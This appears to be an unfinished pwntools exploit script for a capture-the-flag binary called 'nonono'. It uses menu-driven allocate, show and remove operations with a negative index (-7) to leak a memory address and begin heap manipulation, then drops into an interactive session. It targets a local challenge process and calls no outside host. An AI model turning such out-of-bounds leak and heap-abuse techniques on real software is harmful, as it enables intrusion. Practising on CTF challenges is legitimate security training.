from pwn import *

context.binary = './nonono'
elf = ELF('./libc.so.6')
r = process('./nonono')


def new(index, size, content):
    r.sendlineafter('>>', '1')
    r.sendlineafter('IDX : ', str(index))
    r.sendlineafter('SIZE : ', str(size))
    r.sendlineafter('CONTENT: ', content)

def show(index):
    r.sendlineafter('>> ', '2')
    r.sendlineafter('IDX :', str(index))

def remove(index):
    r.sendlineafter('>> ', '3')
    r.sendlineafter('IDX : ', str(index))

show(-7)
data = u64(r.recvline().strip() + '\0\0')
print 'data: {}'.format(hex(data))

new(-7, 0x410, 'aaaaaaaa')
new(0, 0x18, 'bbbbbbbb')
remove(-7)
pause()
r.interactive()
